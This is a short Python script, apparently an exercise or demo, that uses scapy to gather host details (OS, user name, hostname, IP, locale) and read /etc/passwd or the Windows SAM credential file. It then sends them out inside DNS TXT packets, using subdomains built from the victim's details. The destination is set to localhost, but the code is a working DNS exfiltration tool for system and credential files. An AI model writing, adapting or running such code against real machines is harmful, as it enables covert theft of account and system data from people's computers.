from scapy.all import *
import platform
import getpass
import socket
import locale
import time

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

SOURCE_IP = '1.2.3.4'
DEST_IP = '127.0.0.1'

def get_details():
    os = platform.system()
    os_version = platform.release()
    user = getpass.getuser()
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    language = locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "Unknown"

    if os == 'Windows':
        password_file = open('C:\\Windows\\System32\\config\\SAM', 'r').read()
    else:  # Assuming Linux system
        password_file = open('/etc/passwd', 'r').read()

    return os, os_version, user, hostname, ip, language, password_file


def send_dns_query(site, hostname, ip, language, password_file):
    ip = IP(dst=DEST_IP)
    udp = UDP(sport=RandShort(), dport=53)
    dns = DNS(rd=1, qd=DNSQR(qname=site, qtype="TXT", qclass="IN"))
    dns.an = DNSRR(rrname=site, type="TXT", rclass="IN", ttl=1,
                   rdata=f"Hostname: {hostname}, IP: {ip}, Language: {language}, Password File: {password_file}")
    packet = ip / udp / dns
    send(packet, verbose=0)


if __name__ == '__main__':
    details = get_details()
    hostname = details[3]
    ip = details[4]
    language = details[5]
    password_file = details[6]

    for detail in details[:3]:
        site = detail.strip() + '.google.com'
        print(site)
        send_dns_query(site, hostname, ip, language, password_file)

    print("Sending password file...")
    site = "password_file.google.com"
    send_dns_query(site, hostname, ip, language, password_file)
    time.sleep(1)
